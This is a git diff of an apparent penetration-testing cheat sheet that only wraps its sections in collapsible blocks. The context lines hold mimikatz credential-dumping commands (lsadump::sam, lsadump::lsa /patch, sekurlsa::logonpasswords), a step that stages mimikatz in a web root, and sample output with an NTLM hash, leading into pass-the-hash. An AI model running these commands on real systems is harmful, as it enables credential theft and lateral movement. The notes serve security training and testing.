@@ -221,7 +221,8 @@ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 |`lsadump::lsa /patch`|Extracts hashes from memory by asking the LSA server; `/patch` or `/inject` takes place on the fly|
 |`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|
 
-- ☝️ **Note**: mimikatz needs to run from an elevated shell; running mimikatz from a non-elevated shell will not work:
+<details>
+  <summary>☝️ <b>Note</b>: mimikatz needs to run from an elevated shell; running mimikatz from a non-elevated shell will not work:</summary>
 
 ```cmd
 mimikatz # privilege::debug
@@ -245,7 +246,10 @@ mimikatz # sekurlsa::logonpasswords
 ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 ```
 
-## 2.1. Successful `lsadump::sam` example
+</details>
+
+<details>
+  <summary><h2>2.1. Successful <code>lsadump::sam</code> example</h2></summary>
 
 ```cmd
 mimikatz # lsadump::sam
@@ -285,7 +289,10 @@ Supplemental Credentials:
 ⋮
 ```
 
-## 2.2. Successful `lsadump::lsa /patch` example
+</details>
+
+<details>
+  <summary><h2>2.2. Successful <code>lsadump::lsa /patch</code> example</h2></summary>
 
 ```cmd
 mimikatz # lsadump::lsa /patch
@@ -317,7 +324,10 @@ LM   :
 NTLM : 5a2b1b78290d381def497905d467fcff
 ```
 
-## 2.3. Successful `sekurlsa::logonpasswords` example
+</details>
+
+<details>
+  <summary><h2>2.3. Successful <code>sekurlsa::logonpasswords</code> example</h2></summary>
 
 ```cmd
 mimikatz # sekurlsa::logonpasswords
@@ -356,6 +366,8 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 
 ••• OUTPUT TRUNCATED •••
 ```
+
+</details>
 
 # 3. Pass the Hash
 
